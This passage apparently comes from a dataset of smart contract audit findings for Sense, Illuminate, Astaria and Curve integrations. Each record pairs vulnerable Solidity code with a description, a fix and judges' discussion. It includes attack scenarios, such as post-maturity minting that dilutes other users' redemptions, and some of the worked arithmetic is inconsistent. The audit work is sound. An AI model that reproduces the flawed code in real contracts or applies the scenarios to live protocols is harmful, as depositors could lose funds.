targetReserves) = _getSpaceReserves();\n\n        // Calculate how much Target we'll end up joining the pool with, and use that to preview minted LP shares.\n        uint256 previewedLPBal = (assets - _getTargetForIssuance(ptReserves, targetReserves, assets, adapter.scaleStored()))\n            .mulDivDown(_space.adjustedTotalSupply(), targetReserves);\n\n        // Shares represent proportional ownership of LP shares the vault holds.\n        return previewedLPBal.mulDivDown(totalSupply, _space.balanceOf(address(this)));\n    }\n}\n```\n\nIf (previewedLPBal * total) / space balance is truncated to 0, transaction revert. _space.balanceOf can certainly be inflated if malicious actor send the space token to the address manually. Or previewedLPBal * total could just be small and the division is truncated to 0."чSource: https://github.com/sherlock-audit/2022-11-sense-judging/issues/33\nFound by\nctf_sec\nWe recommend the project not deposit a such small amount, or there could be a function that let admin gradually control how many tokens should we put in the first deposit.\nDiscussion\njparklev\nWhile this is an interesting observation and it got us thinking, we don't think that it's something to be concerned about for two reasons:\nroll would be unaffected since the deposit before roll happens during a cooldown period, where the `previewedLPBal.mulDivDown(totalSupply, _space.balanceOf(address(this)))` line is never executed\n`previewedLPBal` is a function of total supply, so if `_space.balanceOf(address(this))` were made larger, so to would `previewedLPBal`\nWe aren't yet on 100% confidence here tho, so if there were to be a test case demonstrating a concrete example of how this could happen, it would be much appreciated 🙏\naktech297\nI believe if this needs to happen, user have to waste a large amount of fund to do it for no personal gain. I see the #41 has fix for this. Further adding, a simple test is needed to ensure the function flow to confirm when the else part would be executed. I don't see the actual flow from the explanation.\n```\n else {\n    Space _space = space;\n    (uint256 ptReserves, uint256 targetReserves) = _getSpaceReserves();\n\n    // Calculate how much Target we'll end up joining the pool with, and use that to preview minted LP shares.\n    uint256 previewedLPBal = (assets - _getTargetForIssuance(ptReserves, targetReserves, assets, adapter.scaleStored()))\n        .mulDivDown(_space.adjustedTotalSupply(), targetReserves);\n\n    // Shares represent proportional ownership of LP shares the vault holds.\n    return previewedLPBal.mulDivDown(totalSupply, _space.balanceOf(address(this)));\n}\n```\n\njacksanford1\nBringing in a comment from the protocol team:\nWe agreed with ak1's comment on this one and, while in theory valid, considered it a prohibitively expensive attack.\nCategorizing it as acknowledged.чcalling roll would revert and the new sponsored series cannot be started properly.\nCode Snippet\nTool used\nManual Review
Math rounding in AutoRoller.sol is not ERC4626-complicant: previewWithdraw should round up.чmediumч```\n    function previewWithdraw(uint256 assets) public view virtual returns (uint256) {\n        uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.\n\n        return supply == 0 ? assets : assets.mulDivUp(supply, totalAssets());\n    }\n```\nчPer EIP 4626's Security Considerations (https://eips.ethereum.org/EIPS/eip-4626)\nFinally, ERC-4626 Vault implementers should be aware of the need for specific, opposing rounding directions across the different mutable and view methods, as it is considered most secure to favor the Vault itself during calculations over its users:\nIf (1) it’s calculating how many shares to issue to a user for a certain amount of the underlying tokens they provide or (2) it’s determining the amount of the underlying tokens to transfer to them for returning a certain amount of shares, it should round down. If (1) it’s calculating the amount of shares a user has to supply to receive a given amount of the underlying tokens or (2) it’s calculating the amount of underlying tokens a user has to provide to receive a certain amount of shares, it should round up.\nThe original implementation for previewWithdraw in Solmate ERC4626 is:\n```\n    function previewWithdraw(uint256 assets) public view virtual returns (uint256) {\n        uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.\n\n        return supply == 0 ? assets : assets.mulDivUp(supply, totalAssets());\n    }\n```\n\n```\nfor (uint256 i = 0; i < 20;) { // 20 chosen as a safe bound for convergence from practical trials.\n    if (guess > supply) {\n        guess = supply;\n    }\n\n    int256 answer = previewRedeem(guess.safeCastToUint()).safeCastToInt() - assets.safeCastToInt();\n\n    if (answer >= 0 && answer <= assets.mulWadDown(0.001e18).safeCastToInt() || (prevAnswer == answer)) { // Err on the side of overestimating shares needed. Could reduce precision for gas efficiency.\n        break;\n    }\n\n    if (guess == supply && answer < 0) revert InsufficientLiquidity();\n\n    int256 nextGuess = guess - (answer * (guess - prevGuess) / (answer - prevAnswer));\n    prevGuess  = guess;\n    prevAnswer = answer;\n    guess      = nextGuess;\n\n    unchecked { ++i; }\n}\n\nreturn guess.safeCastToUint() + maxError; // Buffer for pow discrepancies.\n```\n\nnote the line:\n```\n  int256 answer = previewRedeem(guess.safeCastToUint()).safeCastToInt() - assets.safeCastToInt();\n```\n\npreviewRedeem is round down.\nand later we update guess and return guess\n```\n    int256 nextGuess = guess - (answer * (guess - prevGuess) / (answer - prevAnswer));\n    prevGuess  = guess;\n    prevAnswer = answer;\n    guess      = nextGuess;\n```\n\nand\n```\n return guess.safeCastToUint() + maxError; // Buffer for pow discrepancies.\n```\n\nwhen calculating the the nextGuess, the code does not round up.\n```\nint256 nextGuess = guess - (answer * (guess - prevGuess) / (answer - prevAnswer));\n```\nч"Round up in previewWithdraw using mulDivUp and divWadUp\nDiscussion\njparklev\nOur understanding is that `nextGuess` does not need to be rounded up since it's just a ""guess"" that is confirmed or denied in how close the ""answer"" is to what we're looking for. So the rounding needs to be in the answer assessment stage.\nIn addition, as our comment in the answer inequality says, we do overestimate the shares needed, which is equivalent to rounding up. Perhaps one could make the case that the inequality should be `> 0` rather than `>= 0` so that exact matches from the rounded down `previewRedeem` don't make it through\nGiven the above, we're ok accepting this issue, but disagree with the severity\njparklev\nFix: https://github.com/sense-finance/auto-roller/pull/22\nEvert0x\n@jparklev What severity are you suggesting?\njparklev\n@jparklev What severity are you suggesting?\n`medium` would be our suggestion\naktech297\nVerified the fix. As @jparklev mentioned, `rounding needs to be in the answer assessment stage`, the fix is not related to rounding up. It is related to inequality. so, the fix is to check for `> 0` rather than `>= 0` so that exact matches from the rounded down `previewRedeem` don't make it through."чCode Snippet\nTool used\nManual Review
Lend or mint after maturityчhighч```\n    function mint(\n        uint8 p,\n        address u,\n        uint256 m,\n        uint256 a\n    ) external unpaused(u, m, p) returns (bool) {\n        // Fetch the desired principal token\n        address principal = IMarketPlace(marketPlace).token(u, m, p);\n\n        // Transfer the users principal tokens to the lender contract\n        Safe.transferFrom(IERC20(principal), msg.sender, address(this), a);\n\n        // Mint the tokens received from the user\n        IERC5095(principalToken(u, m)).authMint(msg.sender, a);\n\n        emit Mint(p, u, m, a);\n\n        return true;\n    }\n```\nчThe protocol does not forbid lending or minting after the maturity leaving the possibility to profit from early users.\nLet's take the mint function as an example:\n```\n    function mint(\n        uint8 p,\n        address u,\n        uint256 m,\n        uint256 a\n    ) external unpaused(u, m, p) returns (bool) {\n        // Fetch the desired principal token\n        address principal = IMarketPlace(marketPlace).token(u, m, p);\n\n        // Transfer the users principal tokens to the lender contract\n        Safe.transferFrom(IERC20(principal), msg.sender, address(this), a);\n\n        // Mint the tokens received from the user\n        IERC5095(principalToken(u, m)).authMint(msg.sender, a);\n\n        emit Mint(p, u, m, a);\n\n        return true;\n    }\n```\n\nIt is a simple function that accepts the principal token and mints the corresponding ERC5095 tokens in return. There are no restrictions on timing, the user can mint even after the maturity. Malicious actors can take this as an advantage to pump their bags on behalf of legitimate early users.\nScenario:\nLegitimate users lend and mint their ERC5095 tokens before maturity.\nWhen the maturity kicks in, lender tokens are redeemed and holdings are updated.\nLegitimate users try to redeem their ERC5095 for the underlying tokens. The formula is `(amount * holdings[u][m]) / token.totalSupply();`\nA malicious actor sandwiches legitimate users, and mints the ERC5095 thus increasing the totalSupply and reducing other user shares. Then redeem principals again and burn their own shares for increased rewards.\nExample with concrete values:\nuserA deposits `100` tokens, user B deposits `200` tokens. The total supply minted is `300` ERC5095 tokens.\nAfter the maturity the redemption happens and now let's say `holdings[u][m]` is `330` (+30).\nuserA tries to redeem the underlying. The expected amount is: `100` * `330` / `300` = 110. However, this action is frontrunned by userC (malicious) who mints yet another `500` tokens post-maturity. The total supply becomes `800`. The real value userA now receives is: 110 * `330` / `800` = 45.375.\nAfter that the malicious actor userC invokes the redemption again, and the `holdings[u][m]` is now `330` - 45.375 + `550` = 834.625.\nuserC redeems the underlying: `500` * 834.625 / 700 ~= 596.16 (expected was 550).\nNow all the remaining users will also slightly benefit, e.g. in this case userB redeems what's left: `200 * 238.46 / `200` = 238.46` (expected was 220).ч
Incorrect parametersчmediumч```\n      } else if (p == uint8(Principals.Notional)) {\n            // Principal token must be approved for Notional's lend\n            ILender(lender).approve(address(0), address(0), address(0), a);\n```\nчSome functions and integrations receive the wrong parameters.\nHere, this does not work:\n```\n      } else if (p == uint8(Principals.Notional)) {\n            // Principal token must be approved for Notional's lend\n            ILender(lender).approve(address(0), address(0), address(0), a);\n```\n\nbecause it basically translates to:\n```\n  } else if (p == uint8(Principals.Notional)) {\n   if (a != address(0)) {\n        Safe.approve(IERC20(address(0)), a, type(uint256).max);\n  }\n```\n\nIt tries to approve a non-existing token. It should approve the underlying token and Notional's token contract.\nAnother issue is with Tempus here:\n```\n        // Swap on the Tempus Router using the provided market and params\n        ITempus(controller).depositAndFix(x, lent, true, r, d);\n\n        // Calculate the amount of Tempus principal tokens received after the deposit\n        uint256 received = IERC20(principal).balanceOf(address(this)) - start;\n\n        // Verify that a minimum number of principal tokens were received\n        if (received < r) {\n            revert Exception(11, received, r, address(0), address(0));\n        }\n```\n\nIt passes `r` as a slippage parameter and later checks that received >= `r`. However, in Tempus this parameter is not exactly the minimum amount to receive, it is the ratio which is calculated as follows:\n```\n  /// @param minTYSRate Minimum exchange rate of TYS (denominated in TPS) to receive in exchange for TPS\n    function depositAndFix(\n        ITempusAMM tempusAMM,\n        uint256 tokenAmount,\n        bool isBackingToken,\n        uint256 minTYSRate,\n        uint256 deadline\n    ) external payable nonReentrant {\n// rest of code\n  uint256 minReturn = swapAmount.mulfV(minTYSRate, targetPool.backingTokenONE());\n```\nч
Sense PT redemptions do not allow for known loss scenariosчmediumч```\n- Slashing risk\n\nETH 2.0 validators risk staking penalties, with up to 100% of staked funds at risk if validators fail. To minimise this risk, Lido stakes across multiple professional and reputable node operators with heterogeneous setups, with additional mitigation in the form of insurance that is paid from Lido fees.\n\n- stETH price risk\n\nUsers risk an exchange price of stETH which is lower than inherent value due to withdrawal restrictions on Lido, making arbitrage and risk-free market-making impossible. \n\nThe Lido DAO is driven to mitigate above risks and eliminate them entirely to the extent possible. Despite this, they may still exist and, as such, it is our duty to communicate them.\n```\nчSense PT redemptions do not allow for known loss scenarios, which will lead to principal losses\nThe Sense PT redemption code in the `Redeemer` expects any losses during redemption to be due to a malicious adapter, and requires that there be no losses. However, there are legitimate reasons for there to be losses which aren't accounted for, which will cause the PTs to be unredeemable. The Lido FAQ page lists two such reasons:\n```\n- Slashing risk\n\nETH 2.0 validators risk staking penalties, with up to 100% of staked funds at risk if validators fail. To minimise this risk, Lido stakes across multiple professional and reputable node operators with heterogeneous setups, with additional mitigation in the form of insurance that is paid from Lido fees.\n\n- stETH price risk\n\nUsers risk an exchange price of stETH which is lower than inherent value due to withdrawal restrictions on Lido, making arbitrage and risk-free market-making impossible. \n\nThe Lido DAO is driven to mitigate above risks and eliminate them entirely to the extent possible. Despite this, they may still exist and, as such, it is our duty to communicate them.\n```\n\nhttps://help.lido.fi/en/articles/5230603-what-are-the-risks-of-staking-with-lido\nIf Lido is slashed, or there are withdrawal restrictions, the Sense series sponsor will be forced to settle the series, regardless of the exchange rate (or miss out on their rewards). The Sense `Divider` contract anticipates and properly handles these losses, but the Illuminate code does not.\nLido is just one example of a Sense token that exists in the Illuminate code base - there may be others added in the future which also require there to be allowances for losses.ч
Notional PT redemptions do not use flash-resistant pricesчmediumч```\nMUST return the maximum amount of shares that could be transferred from `owner` through `redeem` and not cause a revert, which MUST NOT be higher than the actual maximum that would be accepted (it should underestimate if necessary).\n\nMUST factor in both global and user-specific limits, like if redemption is entirely disabled (even temporarily) it MUST return 0.\n```\nчNotional PT redemptions do not use the correct function for determining balances, which will lead to principal losses\nEIP-4626 states the following about maxRedeem():\n```\nMUST return the maximum amount of shares that could be transferred from `owner` through `redeem` and not cause a revert, which MUST NOT be higher than the actual maximum that would be accepted (it should underestimate if necessary).\n\nMUST factor in both global and user-specific limits, like if redemption is entirely disabled (even temporarily) it MUST return 0.\n```\n\nhttps://github.com/ethereum/EIPs/blob/12fb4072a8204ae89c384a5562dedfdac32a3bec/EIPS/eip-4626.md?plain=1#L414-L416\nThe above means that the implementer is free to return less than the actual balance, and is in fact required to return zero if the token's backing store is paused, and Notional's can be paused. While neither of these conditions currently apply to the existing wfCashERC4626 implementation, there is nothing stopping Notional from implementing the MUST-return-zero-if-paused fix tomorrow, or from changing their implementation to one that requires `maxRedeem()` to return something other than the current balance.чUse `balanceOf()` rather than `maxRedeem()` in the call to `INotional.redeem()`, and make sure that Illuminate PTs can't be burned if `Lender` still has Notional PTs that it needs to redeem (based on its own accounting of what is remaining, not based on balance checks, so that it can't be griefed with dust).\nDiscussion\n0x00052\nEscalate for 25 USDC\n`While neither of these conditions currently apply to the existing wfCashERC4626 implementation, there is nothing stopping Notional from implementing the MUST-return-zero-if-paused fix tomorrow, or from changing their implementation to one that requires maxRedeem() to return something other than the current balance.`\nWatson clearly acknowledges external factors required for loss of funds. There are so many upgradable contracts that Illuminate integrates with. Seems crazy to me to submit a report for every way that any integrated protocol could upgrade to brick/damage this contract. I think low is most appropriate given the requirement that an underlying protocol has to upgrade to cause damage. Worst case medium but I think that is generous.\nsherlock-admin\nEscalate for 25 USDC\n`While neither of these conditions currently apply to the existing wfCashERC4626 implementation, there is nothing stopping Notional from implementing the MUST-return-zero-if-paused fix tomorrow, or from changing their implementation to one that requires maxRedeem() to return something other than the current balance.`\nWatson clearly acknowledges external factors required for loss of funds. There are so many upgradable contracts that Illuminate integrates with. Seems crazy to me to submit a report for every way that any integrated protocol could upgrade to brick/damage this contract. I think low is most appropriate given the requirement that an underlying protocol has to upgrade to cause damage. Worst case medium but I think that is generous.\nYou've created a valid escalation for 25 USDC!\nTo remove the escalation from consideration: Delete your comment. To change the amount you've staked on this escalation: Edit your comment (do not create a new comment).\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nKenzoAgada\nEscalate for 50 USDC See 52's comments above. At the moment no issue is there, the issue is only if Notional's implementation is changed. Might be considered medium severity.\nsherlock-admin\nEscalate for 50 USDC See 52's comments above. At the moment no issue is there, the issue is only if Notional's implementation is changed. Might be considered medium severity.\nYou've created a valid escalation for 50 USDC!\nTo remove the escalation from consideration: Delete your comment. To change the amount you've staked on this escalation: Edit your comment (do not create a new comment).\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nEvert0x\nEscalation accepted\nsherlock-admin\nEscalation accepted\nThis issue's escalations have been accepted!\nContestants' payouts and scores will be updated according to the changes made on this issue.чPermanent freezing of funds\nIf `maxRedeem()` were to return zero, or some other non-exact value, fewer Notional PTs would be redeemed than are available, and users that redeem()ed their shares, would receive fewer underlying (principal if they minted Illuminate PTs with Notional PTs, e.g. to be an LP in the pool) than they are owed. The Notional PTs that weren't redeemed would still be available for a subsequent call, but if a user already redeemed their Illuminate PTs, their loss will already be locked in, since their Illuminate PTs will have been burned. This would affect ALL Illuminate PT holders of a specific market, not just the ones that provided the Notional PTs, because Illuminate PT redemptions are an a share-of-underlying basis, not on the basis of the originally-provided token. Markets that are already live with Notional set cannot be protected via a redemption pause by the Illuminate admin, because redemption of Lender's external PTs for underlying does not use the `unpaused` modifier, and does have any access control.\nCode Snippet\nTool used\nManual Review
Marketplace.setPrincipal do not approve needed allowance for Element vault and APWine routerчmediumч```\n        } else if (p == uint8(Principals.Apwine)) {\n            address futureVault = IAPWineToken(a).futureVault();\n            address interestBearingToken = IAPWineFutureVault(futureVault)\n                .getIBTAddress();\n            IRedeemer(redeemer).approve(interestBearingToken);\n        } else if (p == uint8(Principals.Notional)) {\n```\nч`Marketplace.setPrincipal` do not approve needed allowance for `Element vault` and `APWine router`\n`Marketplace.setPrincipal` is used to provide principal token for the base token and maturity when it was not set yet. To set PT you also provide protocol that this token belongs to.\nIn case of `APWine` protocol there is special block of code to handle all needed allowance. But it is not enough.\n```\n        } else if (p == uint8(Principals.Apwine)) {\n            address futureVault = IAPWineToken(a).futureVault();\n            address interestBearingToken = IAPWineFutureVault(futureVault)\n                .getIBTAddress();\n            IRedeemer(redeemer).approve(interestBearingToken);\n        } else if (p == uint8(Principals.Notional)) {\n```\n\nBut in `setPrincipal` we don't have such params and allowance is not set. So `Lender` will not be able to work with that tokens correctly.ч
Redeemer.setFee function will always revertчmediumч```\n    function setFee(uint256 f) external authorized(admin) returns (bool) {\n        uint256 feeTime = feeChange;\n        if (feeTime == 0) {\n            revert Exception(23, 0, 0, address(0), address(0));\n        } else if (feeTime < block.timestamp) {\n            revert Exception(\n                24,\n                block.timestamp,\n                feeTime,\n                address(0),\n                address(0)\n            );\n        } else if (f < MIN_FEENOMINATOR) {\n            revert Exception(25, 0, 0, address(0), address(0));\n        }\n        feenominator = f;\n        delete feeChange;\n        emit SetFee(f);\n        return true;\n    }\n```\nч`Redeemer.setFee` function will always revert and will not give ability to change `feenominator`.\n`Redeemer.setFee` function is designed to give ability to change `feenominator` variable.\n```\n    function setFee(uint256 f) external authorized(admin) returns (bool) {\n        uint256 feeTime = feeChange;\n        if (feeTime == 0) {\n            revert Exception(23, 0, 0, address(0), address(0));\n        } else if (feeTime < block.timestamp) {\n            revert Exception(\n                24,\n                block.timestamp,\n                feeTime,\n                address(0),\n                address(0)\n            );\n        } else if (f < MIN_FEENOMINATOR) {\n            revert Exception(25, 0, 0, address(0), address(0));\n        }\n        feenominator = f;\n        delete feeChange;\n        emit SetFee(f);\n        return true;\n    }\n```\n\nAs `feeChange` value is 0(it's not set anywhere), this function will always revert wtih `Exception(23, 0, 0, address(0), address(0))`. Also even if `feeChange` was not 0, the function will give ability to change fee only once, because in the end it calls delete `feeChange` which changes it to 0 again.чDiscussion\nJTraversa\nAgree with Kenzo's escalation\nI suppose I might downgrade to low given no funds are at risk (although the function is clearly not functioning as intended)\n0x00052\nEscalate for 1 USDC\nReminder @Evert0x\nsherlock-admin\nEscalate for 1 USDC\nReminder @Evert0x\nYou've created a valid escalation for 1 USDC!\nTo remove the escalation from consideration: Delete your comment. To change the amount you've staked on this escalation: Edit your comment (do not create a new comment).\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.чFee can't be changed.\nCode Snippet\nProvided above.\nTool used\nManual Review
ERC5095.mint function calculates slippage incorrectlyчmediumч```\n    function mint(address r, uint256 s) external override returns (uint256) {\n        if (block.timestamp > maturity) {\n            revert Exception(\n                21,\n                block.timestamp,\n                maturity,\n                address(0),\n                address(0)\n            );\n        }\n        uint128 assets = Cast.u128(previewMint(s));\n        Safe.transferFrom(\n            IERC20(underlying),\n            msg.sender,\n            address(this),\n            assets\n        );\n        // consider the hardcoded slippage limit, 4626 compliance requires no minimum param.\n        uint128 returned = IMarketPlace(marketplace).sellUnderlying(\n            underlying,\n            maturity,\n            assets,\n            assets - (assets / 100)\n        );\n        _transfer(address(this), r, returned);\n        return returned;\n    }\n```\nчERC5095.mint function calculates slippage incorrectly. This leads to lost of funds for user.\n`ERC5095.mint` function should take amount of shares that user wants to receive and then buy this amount. It uses hardcoded 1% slippage when trades base tokens for principal. But it takes 1% of calculated assets amount, not shares.\n```\n    function mint(address r, uint256 s) external override returns (uint256) {\n        if (block.timestamp > maturity) {\n            revert Exception(\n                21,\n                block.timestamp,\n                maturity,\n                address(0),\n                address(0)\n            );\n        }\n        uint128 assets = Cast.u128(previewMint(s));\n        Safe.transferFrom(\n            IERC20(underlying),\n            msg.sender,\n            address(this),\n            assets\n        );\n        // consider the hardcoded slippage limit, 4626 compliance requires no minimum param.\n        uint128 returned = IMarketPlace(marketplace).sellUnderlying(\n            underlying,\n            maturity,\n            assets,\n            assets - (assets / 100)\n        );\n        _transfer(address(this), r, returned);\n        return returned;\n    }\n```\n\nThis is how slippage is provided\n```\nuint128 returned = IMarketPlace(marketplace).sellUnderlying(\n            underlying,\n            maturity,\n            assets,\n            assets - (assets / 100)\n        );\n```\n\nBut the problem is that assets it is amount of base tokens that user should pay for the shares he want to receive. Slippage should be calculated using shares amount user expect to get.\nExample. User calls mint and provides amount 1000. That means that he wants to get 1000 principal tokens. While converting to assets, assets = 990. That means that user should pay 990 base tokens to get 1000 principal tokens. Then the `sellUnderlying` is send and slippage provided is `990*0.99=980.1`. So when something happens with price it's possible that user will receive 980.1 principal tokens instead of 1000 which is 2% lost.\nTo fix this you should provide `s - (s / 100)` as slippage.чUse this.\n```\nuint128 returned = IMarketPlace(marketplace).sellUnderlying(\n            underlying,\n            maturity,\n            assets,\n            s- (s / 100)\n        );\n```\nчLost of users funds.\nCode Snippet\nProvided above\nTool used\nManual Review
ERC5095.deposit doesn't check if received shares is less then provided amountчmediumч```\n    function deposit(address r, uint256 a) external override returns (uint256) {\n        if (block.timestamp > maturity) {\n            revert Exception(\n                21,\n                block.timestamp,\n                maturity,\n                address(0),\n                address(0)\n            );\n        }\n        uint128 shares = Cast.u128(previewDeposit(a));\n        Safe.transferFrom(IERC20(underlying), msg.sender, address(this), a);\n        // consider the hardcoded slippage limit, 4626 compliance requires no minimum param.\n        uint128 returned = IMarketPlace(marketplace).sellUnderlying(\n            underlying,\n            maturity,\n            Cast.u128(a),\n            shares - (shares / 100)\n        );\n        _transfer(address(this), r, returned);\n        return returned;\n    }\n```\nч`ERC5095.deposit` doesn't check if received shares is less then provided amount. In some cases this leads to lost of funds.\nThe main thing with principal tokens is to buy them when the price is lower (you can buy 101 token while paying only 100 base tokens) as underlying price and then at maturity time to get interest(for example in one month you will get 1 base token in our case).\n`ERC5095.deposit` function takes amount of base token that user wants to deposit and returns amount of shares that he received. To not have loses, the amount of shares should be at least bigger than amount of base tokens provided by user.\n```\n    function deposit(address r, uint256 a) external override returns (uint256) {\n        if (block.timestamp > maturity) {\n            revert Exception(\n                21,\n                block.timestamp,\n                maturity,\n                address(0),\n                address(0)\n            );\n        }\n        uint128 shares = Cast.u128(previewDeposit(a));\n        Safe.transferFrom(IERC20(underlying), msg.sender, address(this), a);\n        // consider the hardcoded slippage limit, 4626 compliance requires no minimum param.\n        uint128 returned = IMarketPlace(marketplace).sellUnderlying(\n            underlying,\n            maturity,\n            Cast.u128(a),\n            shares - (shares / 100)\n        );\n        _transfer(address(this), r, returned);\n        return returned;\n    }\n```\n\nWhile calling market place, you can see that slippage of 1 percent is provided.\n```\nuint128 returned = IMarketPlace(marketplace).sellUnderlying(\n            underlying,\n            maturity,\n            Cast.u128(a),\n            shares - (shares / 100)\n        );\n```\n\nBut this is not enough in some cases.\nFor example we have `ERC5095` token with short maturity which provides `0.5%` of interests. userA calls `deposit` function with 1000 as base amount. He wants to get back 1005 share tokens. And after maturity time earn 5 tokens on this trade.\nBut because of slippage set to `1%`, it's possible that the price will change and user will receive 995 share tokens instead of 1005, which means that user has lost 5 base tokens.\nI propose to add one more mechanism except of slippage. We need to check if returned shares amount is bigger then provided assets amount.ч"Add this check at the end `require(returned > a, ""received less than provided"")`\nDiscussion\nEvert0x\n@sourabhmarathe which severity would you give this? And why?\nsourabhmarathe\nLow severity on the basis that ultimately, user funds are not at risk in this case. However, it is still worth noting that this issue should be addressed using the recommended changes provided in this report.\nEvert0x\nWill keep it medium severity as the protocol agrees to fix the issues which can lead to a loss of funds according to the description.\nJTraversa\nEhhhh its not quite loss of funds in the way described, but im on the fence with this one.\nIt kind of seems that this is a discussion about slippage given the ""loss"" is the same potential marginal loss as the other tickets that discuss slippage within the EIP-5095 interface.\nThat said, hes correct in saying that crossing the 1:1 ratio would imply a loss which might be good to avoid... And the proposed remediation isnt extremely gas heavy.\nBuuut in some other extreme cases there also could be negative APYs? (Look at Europe yo)\nE.g. if we did actually implement this, it would mean that we couldnt mechanically operate in a negative yield environment (though i think a lot of stuff would break as well anyways).\nIf accepted, I'd personally drop it to a low, given the ""potential loss"" is still a static amount related to the slippage params discussed in other tickets? 🤷\n0x00052\nEscalate for 1 USDC\nReminder @Evert0x\nsherlock-admin\nEscalate for 1 USDC\nReminder @Evert0x\nYou've created a valid escalation for 1 USDC!\nTo remove the escalation from consideration: Delete your comment. To change the amount you've staked on this escalation: Edit your comment (do not create a new comment).\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final."чLost of funds.\nCode Snippet\nProvided above.\nTool used\nManual Review
Curve LP Controller withdraw and claim function uses wrong signatureчmediumч```\nbytes4 constant WITHDRAWCLAIM = 0x00ebf5dd;\n```\nч```\nbytes4 constant WITHDRAWCLAIM = 0x00ebf5dd;\n```\n\nHowever, the `withdraw()` function in the Curve contract does not have an address argument. Instead, the function signature reads `withdraw(uint256,bool)`, which corresponds to a function selector of `0x38d07436`.ч
Strategist nonce is not checkedчmediumч"```\n  function validateCommitment(IAstariaRouter.Commitment calldata commitment)\n    public\n    returns (bool valid, IAstariaRouter.LienDetails memory ld)\n  {\n    require(\n      commitment.lienRequest.strategy.deadline >= block.timestamp,\n      ""deadline passed""\n    );\n\n\n    require(\n      strategyValidators[commitment.lienRequest.nlrType] != address(0),\n      ""invalid strategy type""\n    );\n\n\n    bytes32 leaf;\n    (leaf, ld) = IStrategyValidator(\n      strategyValidators[commitment.lienRequest.nlrType]\n    ).validateAndParse(\n        commitment.lienRequest,\n        COLLATERAL_TOKEN.ownerOf(\n          commitment.tokenContract.computeId(commitment.tokenId)\n        ),\n        commitment.tokenContract,\n        commitment.tokenId\n      );\n\n\n    return (\n      MerkleProof.verifyCalldata(\n        commitment.lienRequest.merkle.proof,\n        commitment.lienRequest.merkle.root,\n        leaf\n      ),\n      ld\n    );\n  }\n```\n"ч"Strategist nonce is not checked while checking commitment. This makes impossible for strategist to cancel signed commitment.\n`VaultImplementation.commitToLien` is created to give the ability to borrow from the vault. The conditions of loan are discussed off chain and owner or delegate of the vault then creates and signes deal details. Later borrower can provide it as `IAstariaRouter.Commitment calldata params` param to `VaultImplementation.commitToLien`.\nAfter the checking of signer of commitment `VaultImplementation._validateCommitment` function calls `AstariaRouter.validateCommitment`.\n```\n  function validateCommitment(IAstariaRouter.Commitment calldata commitment)\n    public\n    returns (bool valid, IAstariaRouter.LienDetails memory ld)\n  {\n    require(\n      commitment.lienRequest.strategy.deadline >= block.timestamp,\n      ""deadline passed""\n    );\n\n\n    require(\n      strategyValidators[commitment.lienRequest.nlrType] != address(0),\n      ""invalid strategy type""\n    );\n\n\n    bytes32 leaf;\n    (leaf, ld) = IStrategyValidator(\n      strategyValidators[commitment.lienRequest.nlrType]\n    ).validateAndParse(\n        commitment.lienRequest,\n        COLLATERAL_TOKEN.ownerOf(\n          commitment.tokenContract.computeId(commitment.tokenId)\n        ),\n        commitment.tokenContract,\n        commitment.tokenId\n      );\n\n\n    return (\n      MerkleProof.verifyCalldata(\n        commitment.lienRequest.merkle.proof,\n        commitment.lienRequest.merkle.root,\n        leaf\n      ),\n      ld\n    );\n  }\n```\n\nThis function check additional params, one of which is `commitment.lienRequest.strategy.deadline`. But it doesn't check for the nonce of strategist here. But this nonce is used while signing.\nAlso `AstariaRouter` gives ability to increment nonce for strategist, but it is never called. That means that currently strategist use always same nonce and can't cancel his commitment."чGive ability to strategist to call `increaseNonce` function.чStrategist can't cancel his commitment. User can use this commitment to borrow up to 5 times.\nCode Snippet\nProvided above\nTool used\nManual Review
The implied value of a public vault can be impaired, liquidity providers can lose fundsчhighч```\nLien storage lien = lienData[lienId];\nlien.amount = _getOwed(lien); // @audit current debt, including accrued interest; saved to storage!\n```\nчThe implied value of a public vault can be impaired, liquidity providers can lose funds\n```\nLien storage lien = lienData[lienId];\nlien.amount = _getOwed(lien); // @audit current debt, including accrued interest; saved to storage!\n```\n\nNotice that `lien.amount` is updated in storage, and `lien.last` wasn't updated.\n```\nif (isPublicVault) {\n  // @audit calculates and subtracts lien's slope from vault's slope\n  IPublicVault(lienOwner).beforePayment(lienId, paymentAmount);\n}\nif (lien.amount > paymentAmount) {\n  lien.amount -= paymentAmount;\n  // @audit lien.last is updated only after payment amount subtraction\n  lien.last = block.timestamp.safeCastTo32();\n  // slope does not need to be updated if paying off the rest, since we neutralize slope in beforePayment()\n  if (isPublicVault) {\n    // @audit re-calculates and re-applies lien's slope after the repayment\n    IPublicVault(lienOwner).afterPayment(lienId);\n  }\n}\n```\n\n```\nfunction beforePayment(uint256 lienId, uint256 amount) public onlyLienToken {\n  _handleStrategistInterestReward(lienId, amount);\n  uint256 lienSlope = LIEN_TOKEN().calculateSlope(lienId);\n  if (lienSlope > slope) {\n    slope = 0;\n  } else {\n    slope -= lienSlope;\n  }\n  last = block.timestamp;\n}\n```\n\n```\nfunction calculateSlope(uint256 lienId) public view returns (uint256) {\n  // @audit lien.amount includes interest accrued so far\n  Lien memory lien = lienData[lienId];\n  uint256 end = (lien.start + lien.duration);\n  uint256 owedAtEnd = _getOwed(lien, end);\n  // @audit lien.last wasn't updated in `_payment`, it's an older timestamp\n  return (owedAtEnd - lien.amount).mulDivDown(1, end - lien.last);\n}\n```\n\n```\nfunction _getOwed(Lien memory lien, uint256 timestamp)\n  internal\n  view\n  returns (uint256)\n{\n  // @audit lien.amount already includes interest accrued so far\n  return lien.amount + _getInterest(lien, timestamp);\n}\n```\n\n```\nfunction _getInterest(Lien memory lien, uint256 timestamp)\n  internal\n  view\n  returns (uint256)\n{\n  if (!lien.active) {\n    return uint256(0);\n  }\n  uint256 delta_t;\n  if (block.timestamp >= lien.start + lien.duration) {\n    delta_t = uint256(lien.start + lien.duration - lien.last);\n  } else {\n    // @audit lien.last wasn't updated in `_payment`, so the `delta_t` is bigger here\n    delta_t = uint256(timestamp.safeCastTo32() - lien.last);\n  }\n  return\n    // @audit rate applied to a longer delta_t and multiplied by a bigger amount than expected\n    delta_t.mulDivDown(lien.rate, 1).mulDivDown(\n      lien.amount,\n      